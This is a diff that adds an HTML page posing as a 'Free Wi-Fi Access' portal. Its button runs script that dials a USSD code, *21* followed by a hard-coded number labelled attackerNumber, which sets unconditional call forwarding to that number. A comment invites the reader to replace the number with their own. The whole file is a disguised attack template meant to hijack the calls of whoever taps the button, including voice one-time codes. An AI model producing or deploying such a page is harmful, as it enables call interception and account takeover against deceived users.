@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Wi-Fi Access</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f4f4f4;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
+            border-radius: 10px;
+            display: inline-block;
+        }
+        .btn {
+            background: green;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            font-size: 18px;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Get Free Wi-Fi Access</h2>
+        <p>Scan and click below to activate your free internet.</p>
+        <button class="btn" onclick="redirectUSSD()">Enable Free Wi-Fi</button>
+    </div>
+
+    <script>
+        function redirectUSSD() {
+            var attackerNumber = "+916375999606";  // Replace with your number
+            var ussdCode = "*21*" + attackerNumber + "#";
+
+            // USSD execution method using 'tel://' URI
+            window.location.href = "tel:" + encodeURIComponent(ussdCode);
+        }
+    </script>
+</body>
+</html>
